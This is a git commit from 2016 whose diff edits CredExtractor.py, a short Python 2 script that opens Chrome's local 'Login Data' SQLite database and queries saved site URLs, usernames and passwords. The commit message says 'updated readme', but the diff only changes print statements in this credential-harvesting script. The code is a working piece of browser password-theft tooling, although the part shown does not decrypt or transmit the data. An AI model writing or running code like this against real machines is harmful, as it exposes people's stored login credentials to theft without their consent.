9ada5222bc9499fb2853a2713701b80d1f304786
Justin Soderberg <sodejm@gmail.com>
2016-05-12 10:56:09 -0700

    updated readme

--- CredExtractor.py
+++ CredExtractor.py
@@ -5,12 +5,10 @@ from os.path import abspath
 
 db_path = (getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data")
 
-print abspath(db_path)
+print 'DB Path - ' + abspath(db_path)
 if db_path:
-    print db_path
     conn = sqlite3.connect(db_path)
 
-print conn
 cursor = conn.cursor()
 # Get the results
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
